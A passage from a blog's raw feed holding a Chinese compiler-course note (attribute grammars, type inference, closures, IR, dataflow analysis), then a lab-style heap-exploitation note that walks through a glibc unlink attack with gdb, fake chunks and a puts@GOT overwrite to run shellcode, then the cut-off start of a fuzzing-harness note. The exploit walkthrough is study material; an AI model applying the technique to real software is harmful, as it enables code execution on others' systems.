而做引用消解可能会产生几个结果：</p><ul><li>解析出了准确的引用关系。</li><li>重复定义（在声明新的符号的时候，发现这个符号已经被定义过了）。</li><li>引用失败（找不到某个符号的定义）。</li><li>如果两个不同的命名空间中都有相同名称的符号，编程者需要明确指定。</li></ul></li><li><p>左值与右值</p></li><li><p>属性计算</p><p>  属性计算是做上下文分析，或者说语义分析的一种算法。按照属性计算的视角，我们之前所处理的各种语义分析问题，都可以看做是对 AST 节点的某个属性进行计算。比如，针对求左值场景中的 primary 节点，它需要计算的属性包括：</p><ul><li>它的变量定义是哪个（这就引用到定义该变量的 Symbol）。</li><li>它的类型是什么?</li><li>它的作用域是什么？</li><li>这个节点求值时，是否该返回左值？能否正确地返回一个左值？</li><li>它的值是什么？</li></ul><p>  从属性计算的角度看，对表达式求值，或运行脚本，只是去计算 AST 节点的 Value 属性，Value 这个属性能够计算，其他属性当然也能计算。</p><p>  属性计算需要用到属性文法。在词法、语法分析阶段，我们分别学习了正则文法和上下文无关文法，在语义分析阶段我们要了解的是<strong>属性文法（Attribute Grammar）。</strong></p><p>  总结一下属性计算的特点：<strong>它会基于语法规则，增加一些与语义处理有关的规则</strong>。所以，我们也把这种语义规则的定义叫做<strong>语法制导的定义</strong>（Syntax directed definition，SDD），如果变成计算动作，就叫做<strong>语法制导的翻译</strong>（Syntax directed translation，SDT）。</p>  <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">class</span> <span class="title class_">AnnotatedTree</span> &#123;</span><br><span class="line">    <span class="comment">// AST</span></span><br><span class="line">    protected <span class="title class_">ParseTree</span> ast = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 解析出来的所有类型，包括类和函数</span></span><br><span class="line">    protected <span class="title class_">List</span>&lt;<span class="title class_">Type</span>&gt; types = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;<span class="title class_">Type</span>&gt;();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// AST 节点对应的 Symbol</span></span><br><span class="line">    protected <span class="title class_">Map</span>&lt;<span class="title class_">ParserRuleContext</span>, <span class="title class_">Symbol</span>&gt; symbolOfNode = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;<span class="title class_">ParserRuleContext</span>, <span class="title class_">Symbol</span>&gt;();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// AST 节点对应的 Scope，如 for、函数调用会启动新的 Scope</span></span><br><span class="line">    protected <span class="title class_">Map</span>&lt;<span class="title class_">ParserRuleContext</span>, <span class="title class_">Scope</span>&gt; node2Scope = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;<span class="title class_">ParserRuleContext</span>, <span class="title class_">Scope</span>&gt;();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 每个节点推断出来的类型</span></span><br><span class="line">    protected <span class="title class_">Map</span>&lt;<span class="title class_">ParserRuleContext</span>, <span class="title class_">Type</span>&gt; typeOfNode = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;<span class="title class_">ParserRuleContext</span>, <span class="title class_">Type</span>&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 命名空间，作用域的根节点</span></span><br><span class="line">    <span class="title class_">NameSpace</span> nameSpace = <span class="literal">null</span>;  </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>类型系统</p><ul><li><p>类型推导（Type Inference）</p><p>  如果一种属性能够从<strong>下级节点</strong>推导出来，那么这种属性就叫做 <strong>S 属性</strong>，字面意思是综合属性，就是在 AST 中从下级的属性归纳、综合出本级的属性。更准确地说，是通过下级节点和自身来确定的。</p>  <img src="/2022/07/08/CompilerNote/Untitled15.png" class title="Untitled"><p>  与 S 属性相对应的是<strong>I 属性（Inherited Attribute）</strong>继承属性，即 AST 中某个节点的属性是由<strong>上级节点、兄弟节点和它自身</strong>来决定的</p><ul><li><p>例子</p>  <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//变量声明的语法</span></span><br><span class="line">variableDeclarators</span><br><span class="line">    : typeType variableDeclarator (<span class="string">&#x27;,&#x27;</span> variableDeclarator)*</span><br><span class="line">    ;</span><br><span class="line"> </span><br><span class="line">variableDeclarator</span><br><span class="line">    : variableDeclaratorId (<span class="string">&#x27;=&#x27;</span> variableInitializer)?</span><br><span class="line">    ;</span><br><span class="line"> </span><br><span class="line">variableDeclaratorId</span><br><span class="line">    : <span class="variable constant_">IDENTIFIER</span> (<span class="string">&#x27;[&#x27;</span> <span class="string">&#x27;]&#x27;</span>)*</span><br><span class="line">    ;</span><br><span class="line"> </span><br><span class="line">typeType</span><br><span class="line">    : (classOrInterfaceType| functionType | primitiveType) (<span class="string">&#x27;[&#x27;</span> <span class="string">&#x27;]&#x27;</span>)*</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>  那么int a;这句变量声明的AST就会：</p>  <img src="/2022/07/08/CompilerNote/Untitled16.png" class title="Untitled"><p>  这棵树的左枝，可以从下向上推导类型，所以类型属性也就是 S 属性。而右枝则必须从根节点（也就是 variableDeclarators）往下继承类型属性，所以对于 a 这个节点来说，它的类型属性是 I 属性。</p></li><li><p>c++ auto变量能进行对象类型推导如何实现</p><p>  类型推断就是两个计算过程。一个是S属性（综合属性）<strong>（Synthesized Attribute）</strong>计算，从下往上推导，比如：</p><p>  auto a &#x3D; 2;</p><p>  从叶子节点2能推导出这整个语句的类型是int。再做I属性（继承属性）计算，就是从上到下的推导。a是这个表达式的叶子节点，a的类型是可以从整个表达式的类型继承下来。</p></li></ul></li><li><p>类型检查（Type Checking）</p><p>  类型检查主要出现在几个场景中：</p><ul><li>赋值语句（检查赋值操作左边和右边的类型是否匹配）。</li><li>变量声明语句（因为变量声明语句中也会有初始化部分，所以也需要类型匹配）。</li><li>函数传参（调用函数的时候，传入的参数要符合形参的要求）。</li><li>函数返回值（从函数中返回一个值的时候，要符合函数返回值的规定）。</li></ul><p>  类型检查还有一个特点：以赋值语句为例，左边的类型，是 I 属性，是从声明中得到的；右边的类型是 S 属性，是自下而上综合出来的。当左右两边的类型相遇之后，就要检查二者是否匹配，被赋值的变量要满足左边的类型要求。  </p></li><li><p>类型转换（Type Conversion）</p></li><li><p>子类型</p><p>  面向对象编程时，我们可以给某个类创建不同的子类，实现一些个性化的功能；写程序时，我们可以站在抽象度更高的层次上，不去管具体的差异。如果把上面的结论抽象成一般意义上的类型理论，就是<strong>子类型（subtype）。</strong></p><p>  子类型（或者动名词：子类型化），是对我们前面讲的类型体系的一个补充。</p><p>  子类型有两种实现方式：一种就是像 Java 和 C++ 语言，需要显式声明继承了什么类，或者实现了什么接口。这种叫做<strong>名义子类型</strong>（Nominal Subtyping）。另一种是<strong>结构化子类型</strong>（Structural Subtyping），又叫鸭子类型（Duck Type）</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在调用类的属性和方法时，我们可以根据运行时获得的，确定的类型信息进行动态绑定</span></span><br><span class="line"><span class="comment">//实现多态</span></span><br><span class="line"><span class="keyword">protected</span> Function <span class="title function_">getFunction</span><span class="params">(String name,List&lt;Type&gt; paramTypes)</span>&#123;</span><br><span class="line"><span class="comment">// 在本级查找这个这个方法</span></span><br><span class="line">    <span class="type">Function</span> <span class="variable">rtn</span> <span class="operator">=</span> <span class="built_in">super</span>.getFunction(name, paramTypes);  <span class="comment">//TODO 是否要检查 visibility</span></span><br><span class="line">    <span class="comment">// 如果在本级找不到，那么递归的从父类中查找</span></span><br><span class="line">    <span class="keyword">if</span> (rtn == <span class="literal">null</span> &amp;&amp; parentClass != <span class="literal">null</span>)&#123;</span><br><span class="line">        rtn = parentClass.getFunction(name,paramTypes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rtn;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>  如果当前类里面没有实现这个方法，它可以直接复用某一级的父类中的实现，<strong>这实际上就是继承机制在运行期的原理。</strong></p><ul><li>this和super</li></ul></li></ul></li><li><p>闭包</p>  <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> fun1 = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">0</span>;                <span class="comment">// 函数内的局部变量</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> inner = <span class="keyword">function</span>(<span class="params"></span>)&#123;   <span class="comment">// 内部的一个函数</span></span><br><span class="line">        a = a+<span class="number">1</span>;</span><br><span class="line">        b = b+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> b;             <span class="comment">// 返回内部的成员</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> inner;             <span class="comment">// 返回一个函数</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;outside:  a=%d&quot;</span>, a);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> fun2 = <span class="title function_">fun1</span>();                            <span class="comment">// 生成闭包</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i&lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fun2: b=%d a=%d&quot;</span>,<span class="title function_">fun2</span>(), a); <span class="comment">// 通过 fun2() 来访问 b</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> fun3 = <span class="title function_">fun1</span>();                            <span class="comment">// 生成第二个闭包</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i&lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fun3: b=%d a=%d&quot;</span>,<span class="title function_">fun3</span>(), a); <span class="comment">// b 等于 1，重新开始</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="attr">outside</span>:  a=<span class="number">0</span></span><br><span class="line"><span class="attr">fun2</span>: b=<span class="number">1</span> a=<span class="number">1</span> <span class="comment">//生成闭包，创建外部的b = 0</span></span><br><span class="line"><span class="attr">fun2</span>: b=<span class="number">2</span> a=<span class="number">2</span></span><br><span class="line"><span class="attr">fun3</span>: b=<span class="number">1</span> a=<span class="number">3</span> <span class="comment">//生成闭包，创建外部的b = 0</span></span><br><span class="line"><span class="attr">fun3</span>: b=<span class="number">2</span> a=<span class="number">4</span></span><br></pre></td></tr></table></figure><p>  内层函数能访问它“看得见”的变量，包括自己的<strong>本地变量</strong>、<strong>外层函数的变量 b</strong> 和<strong>全局变量 a</strong>。就是说，内层函数作为返回值赋值给其他变量以后，外层函数就结束了，但内层函数仍能访问原来外层函数的变量 b，也能访问全局变量 a。</p>  <img src="/2022/07/08/CompilerNote/Untitled17.png" class title="Untitled"><p>  闭包的内在矛盾是<strong>运行时</strong>的环境和<strong>定义时</strong>的作用域之间的矛盾。那么我们把内部环境中需要的变量，打包交给闭包函数，它就可以随时访问这些变量了。</p></li></ul><h1 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h1><ul><li><p>中间代码（Intermediate Representation，IR）的机制</p><p>  IR 可以有多种格式，在第 24 讲，我们会介绍三地址代码、静态单赋值码等不同的 IR。比如，“x + y * z”翻译成三地址代码是下面的样子，每行代码最多涉及三个地址，其中 t1 和 t2 是临时变量：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t1 := y * z</span><br><span class="line">t2 := x + t1</span><br></pre></td></tr></table></figure><p>  Java 语言生成的字节码也是一种 IR ，AST 其实也可以看做一种 IR。我们在前端部分实现的脚本语言，就是基于 AST 这个 IR 来运行的。</p><p>  每种 IR 的目的和用途是不一样的：</p><ul><li>AST 主要用于前端的工作。</li><li>Java 的字节码，是设计用来在虚拟机上运行的。</li><li>LLVM 的中间代码，主要是用于做代码翻译和编译优化的。</li></ul></li><li><p>代码优化</p><p>  有多种优化技术，比如局部优化和全局优化，代数优化、常数折叠、拷贝传播、常数传播、删除公共子表达式、删除不可达块、死代码删除等，其中数据流分析方法比较重要。又例如mem2reg 算法，会把对内存的访问优化成尽量访问寄存器。</p><ul><li><p>本地优化（针对一个基本块）</p><p>  可用表达式分析和活跃性分析，都可以看做是由下面 4个元素构成的：</p><ul><li><p>D（方向）：是朝前还是朝后遍历。</p></li><li><p>V（值）：代码的每一个地方都要计算出一个值。可用表达式分析和活跃性分析的值是一个集合，也有些分析的值并不是集合，在下一讲你会看到这样的例子。</p></li><li><p>F（转换函数，对 V 进行转换）：比如，在做可用表达式分析的时候，遇到了“c :&#x3D;b”时，可用表达式的集合从{a :&#x3D; b, c :&#x3D; a + b}转换成了{a :&#x3D; b, c :&#x3D; b}。<strong>这里遵守的转换规则是：</strong>因为变量 c 被重新赋值了，那么就从集合里，把变量 c 原来的定义去掉，并把带有 c的表达式都去掉，因为过去的 c 已经失效了，然后，把变量 c 新的定义加进去。</p></li><li><p>I（初始值，是算法开始时 V 的取值）：做可用表达式分析的时候，初始值是空集。在做</p></li><li><p>Λ（lambda）：做全局优化的时候，两个分支相遇的时，要做一个运算，计算他们相交的值。</p><p>  活跃性分析的时候，初始值是后面代码中还会访问的变量，也就是活变量。</p></li></ul><p>  在 LLVM 内部，优化工作是通过一个个的 Pass（遍）来实现的，它支持三种类型的Pass：</p><ul><li>分析型的 Pass（Analysis Passes），只是做分析，产生一些分析结果用于后序操作。</li><li>代码转换的Pass（Transform Passes），比如做公共子表达式删除。</li><li>工具型pass ，比如对模块做正确性验证。</li></ul>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个 PassManager</span></span><br><span class="line">TheFPM = <span class="built_in">std</span>::make_unique&lt;legacy::FunctionPassManager&gt;(TheModule.get());</span><br><span class="line"><span class="comment">//优化添加两个pass</span></span><br><span class="line"><span class="comment">//窥孔优化和一些计算优化</span></span><br><span class="line">TheFPM-&gt;add(createInstructionCombiningPass());</span><br><span class="line"><span class="comment">//表达式重关联</span></span><br><span class="line">TheFPM-&gt;add(createReassociatePass());</span><br><span class="line">TheFPM-&gt;doInitialization();</span><br><span class="line">TheFPM-&gt;run(*fun);</span><br></pre></td></tr></table></figure></li><li><p>全局优化（针对多个基本块）</p><ul><li>代码移动（code motion）能够将代码从一个基本块挪到另一个基本块，比如从循环内<br>  部挪到循环外部，来减少不必要的计算。</li><li>部分冗余删除（Partial Redundancy Elimination），它能把一个基本块都删掉。</li></ul><p>  在本地优化的算法思路上，解决掉多路径情况下，V 值的计算问题。<strong>而这种基于 CFG 做优化分析的方法框架，就叫做数据流分析。</strong>  </p></li><li><p>数据流分析</p><ul><li><p>活跃性分析</p>  <img src="/2022/07/08/CompilerNote/Untitled18.png" class title="Untitled">  <img src="/2022/07/08/CompilerNote/Untitled19.png" class title="Untitled"><p>  加个环路，运用不动点算法：给每个基本块的V值都分配初始值，也就是空集合，然后对所有节点多次计算，直到所有集合都稳定为止。注意四块都是相互依赖的，不能删去d</p>  <img src="/2022/07/08/CompilerNote/Untitled20.png" class title="Untitled"></li><li><p>半格理论（Semilattice）</p><p>  半格理论是一种偏序集，偏序集就是集合中只有部分成员能互相比较大小。例如，在做全局活跃性分析的时候，{a, b, c}和{a, c}相遇，产生的新值是{a, b, c}。我们形式化地写成{a, b, c} Λ {a, c} &#x3D; {a, b, c}。这时候我们说{a, b, c}是可以跟{a, c}比较大小的。那么哪个大哪个小呢？如果 XΛY&#x3D;X，我们说 X&lt;&#x3D;Y。<br>  所以，{a, b, c}是比较小的，{a, c}是比较大的。<br>  当然，{a, b, c}也可以跟{a, b}比较大小，但它没有办法跟{c, d}比较大小。所以把包含了</p></li></ul></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UAFnote</title>
      <link href="/2022/07/08/UAFnote/"/>
      <url>/2022/07/08/UAFnote/</url>
      
        <content type="html"><![CDATA[<ul><li><p>use after free</p><p>  free之后的变量，该变量的堆内存处的内存指针还在指向该内存处，所以当我们下一次申请同样大小的变量时，可以申请到上一个变量的位置</p>  <img src="/2022/07/08/UAFnote/Untitled.png" class title="Untitled"><p>  使用gdb可视化观察堆</p>  <img src="/2022/07/08/UAFnote/Untitled1.png" class title="Untitled"></li><li><p>free()</p>  <img src="/2022/07/08/UAFnote/Untitled2.png" class title="Untitled"></li><li><p>观察堆</p><p>  set disassembly-flavor intel</p><p>  set pagination off</p><p>  disassembly main</p><p>  info proc mapping 查看内存映射</p><p>  deine hook-stop</p><p>  x&#x2F;56wx 0x804c000</p><p>  x&#x2F;3i $eip</p><p>  end</p><p>  查看第一次malloc(32)，该快已被标记not free</p>  <img src="/2022/07/08/UAFnote/Untitled3.png" class title="Untitled"><p>  查看strcpy之后</p><p>  每个地址4字节，每行16字节，即0x10大小</p>  <img src="/2022/07/08/UAFnote/Untitled4.png" class title="Untitled"><p>  free(c)</p>  <img src="/2022/07/08/UAFnote/Untitled5.png" class title="Untitled"><p>  现在就有个了新的块叫fastbins，这个c作为头</p><p>  free(b)</p>  <img src="/2022/07/08/UAFnote/Untitled6.png" class title="Untitled"><p>  链表fastbins:c←b</p><p>  free(a)</p>  <img src="/2022/07/08/UAFnote/Untitled7.png" class title="Untitled"><p>  链表fastbins:c←b←a</p><p>  unlink (): 如果刚释放的堆块要与前面或者后面的堆块进行合并操作，那么需要把前面或者后面的堆块从双向链表中摘取下来，合成更大的堆块插入到别的bin之中，将空闲堆块从bin里面摘取下来的操作就是unlink</p>  <figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward 往前合并*/</span> </span><br><span class="line"> <span class="comment">//先检查要free chunk的上一个chunk是不是 in_use，不是的话就往下操作 </span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line"><span class="comment">//取p的前一个chunk的size</span></span><br><span class="line">prevsize = prev_size(p);</span><br><span class="line"><span class="comment">//free_chunk的size + 上一个chunk的size </span></span><br><span class="line">size += prevsize; </span><br><span class="line"><span class="comment">//p指向上一个chunk的开始处 </span></span><br><span class="line">p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize)); </span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize)) </span><br><span class="line"><span class="comment">//检查前后改变的chunk的size大小跟prev_size是不是相等 </span></span><br><span class="line">malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>); </span><br><span class="line">unlink(av, p, bck, fwd); <span class="comment">//这个就是我们要利用的地方了，下面有详解 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <img src="/2022/07/08/UAFnote/Untitled8.png" class title="Untitled"><p>  P是从block we want to free的prevsize找到的previous block</p><p>  FD是通过P的fd找到的，BK是通过P的bk找到的</p><p>  用gdb模拟攻击</p><p>  set {int}0x804c054&#x3D;100,使得size这里的最尾位为0（freed）</p>  <img src="/2022/07/08/UAFnote/Untitled9.png" class title="Untitled"><p>  再把prevsize设成0x10因为我们想要创造一个fake chunk,然后往前数0x10大小的chunk的size改成0x11代表in use.</p>  <img src="/2022/07/08/UAFnote/Untitled10.png" class title="Untitled"><p>  然后把GOT表的put函数地址搞来，放在前面那个假装in use块的fd处</p>  <img src="/2022/07/08/UAFnote/Untitled11.png" class title="Untitled"><p>  bk放heap里放shellcode的地址</p>  <img src="/2022/07/08/UAFnote/Untitled12.png" class title="Untitled"><p>  注意一下，chunk空闲的时候FD和BK才发挥作用，如果非空闲那么从FD开始就是usedata了</p></li><li><p>free的时候会检查能否向前和向后合并</p><p>  来自 ：<a href="https://wooyun.js.org/drops/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84unlink%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html">https://wooyun.js.org/drops/堆溢出的unlink利用方法.html</a></p><p>  1)检查是否可以向后合并</p><p>  首先需要检查<code>previous chunk</code>是否是空闲的（通过当前<code>chunk size</code>部分中的<code>flag</code>最低位去判断），当然在这个例子中，前一个<code>chunk</code>是正在使用的，不满足向后合并的条件。</p><p>  2)检查是否可以向前合并</p><p>  在这里需要检查<code>next chunk</code>是否是空闲的(通过<code>下下个chunk</code>的flag的最低位去判断) ，</p><p>  在找<code>下下个chunk</code>(这里的下、包括下下都是相对于<code>chunk first</code>而言的)的过程中，</p><p>  首先<code>当前chunk+当前size</code>可以引导到<code>下个chunk</code>，</p><p>  然后从<code>下个chunk的开头+下个chunk的size</code>就可以引导到<code>下下个chunk</code>。</p><p>  但是我们已经把<code>下个chunk的size</code>覆盖为了-4，</p><p>  那么它会认为<code>下个chunk</code>从<code>prev_size</code>开始就是<code>下下个chunk</code>了，</p><p>  既然已经找到了<code>下下个chunk</code>，那就就要去看看<code>size</code>的最低位以确定<code>下个chunk</code>是否在使用，当然这个<code>size</code>是<code>-4</code>，所以它指示<code>下个chunk</code>是空闲的。</p><p>  在这个时候，就要发生向前合并了。即<code>first chunk</code>会和 <code>first chunk</code>的<code>下个chunk</code>(即<code>second chunk</code>)发生合并。在此时会触发<code>unlink(second)</code>宏，想将<code>second</code>从它所在的<code>bin list</code>中解引用。</p>  <img src="/2022/07/08/UAFnote/Untitled13.png" class title="Untitled">  <img src="/2022/07/08/UAFnote/Untitled14.png" class title="Untitled">  <img src="/2022/07/08/UAFnote/Untitled15.png" class title="Untitled"><p>  具体如下</p></li><li><p>how computer handle negative values</p><p>  cale in 32 bit : 0xFFFF FFFC + 0x64 &#x3D; 0x60</p><p>  the same to :-0x4 + 0x64  &#x3D; 0x60</p>  <img src="/2022/07/08/UAFnote/Untitled16.png" class title="Untitled"><p>  Null-Bytes :0xFFFF FFFC &#x3D; -4</p><p>  所以现在有两个要求：</p><p>  1.因为要用双链表merge所以得size&gt;80(因为要避免单链表fastbin &lt; 80)</p><p>  2.set prev not in use,last bit of the block we going to free is set to 0.</p><p>  所以我们需要两个fake chunk，第一个用来伪造FD和BK来覆盖上GOT函数地址，第二个用来把size的最低位设为0.</p>  <img src="/2022/07/08/UAFnote/Untitled17.png" class title="Untitled"><p>  而在查找size时候是用加offset来做的，不关心我们用了多大的size</p><p>  然后我们把offset&#x2F;size设成0xFFFF FFFC导致最后的结果为-4</p>  <img src="/2022/07/08/UAFnote/Untitled18.png" class title="Untitled"><p>  这时候查找nextchunk的时候会找到我们仍set的ffff fffc的地方</p>  <img src="/2022/07/08/UAFnote/Untitled19.png" class title="Untitled"><p>  然后就向后合并unlink了</p>  <img src="/2022/07/08/UAFnote/Untitled20.png" class title="Untitled"></li><li><p>利用unlink把shellcode写进put函数</p><p>  因为我们把b的fd改掉所以触发了向前合并，要把b从bin里摘下来，就是b的unlink操作，执行<code>unlink</code>宏之后，再调用put其实就是调用<code>shellcode</code>，这时就可以执行任意命令了。</p>  <figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unlink()</span></span><br><span class="line">BK=b-&gt;bk（在例子中bk实际上是shellcode的地址）</span><br><span class="line">FD=b-&gt;fd (在例子中fd实际上是put@got的地址 - <span class="number">12</span>)</span><br><span class="line">FD-&gt;bk=BK</span><br><span class="line"><span class="comment">/*shellcode的地址被写进了FD+12的位置，但是FD是put@got的地址-12，所以实际上我们已经把shellcode地址写入了pu&#x27;t@got*/</span></span><br><span class="line">BK-&gt;fd=FD</span><br></pre></td></tr></table></figure><p>  在线汇编编写shellcode  ：  <a href="https://defuse.ca/online-x86-assembler.htm">https://defuse.ca/online-x86-assembler.htm</a></p><p>  在strcpy(b)写入</p>  <img src="/2022/07/08/UAFnote/Untitled21.png" class title="Untitled">  <img src="/2022/07/08/UAFnote/Untitled22.png" class title="Untitled"><p>  覆盖到第三个chunk的size为0x65，如下图所示</p>  <img src="/2022/07/08/UAFnote/Untitled23.png" class title="Untitled"><p>  strcpy(c)写入GOT@put -12</p>  <img src="/2022/07/08/UAFnote/Untitled24.png" class title="Untitled"><p>  最终为</p>  <img src="/2022/07/08/UAFnote/Untitled25.png" class title="Untitled"><p>  strcpy(a)里写入winner的地址</p><p>  找一下winner（）的地址：x winner </p><p>  然后mov eax ,address ; call eax ;在线转shellcode </p>  <img src="/2022/07/08/UAFnote/Untitled26.png" class title="Untitled"><p>  然后报错了 看看heap</p>  <img src="/2022/07/08/UAFnote/Untitled27.png" class title="Untitled"><p>  擦 他说free三次导致错误了</p><p>  把c的改成指向0x804c014,然后再填了a变成</p>  <img src="/2022/07/08/UAFnote/Untitled28.png" class title="Untitled"></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Harness Writing</title>
      <link href="/2022/05/09/Harness-Writing/"/>
      <url>/2022/05/09/Harness-Writing/</url>
      
        <content type="html"><![CDATA[<p>A harness could be thought of as a minimally working application that ：</p><ul><li>loads a library</li><li>accepts a given input</li><li>calls its entry functions</li><li>exits when the execution finishes</li><li>check if process died</li><li>check if process zombied</li><li>check PID</li><li>check logs</li><li>attach debugger,check process state</li></ul><p>开始调试发现调用了一个大小0x20的函数指针结构体，使用nop宏来分析其调用，然后根据调用来逆向每个nop所执行的动作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 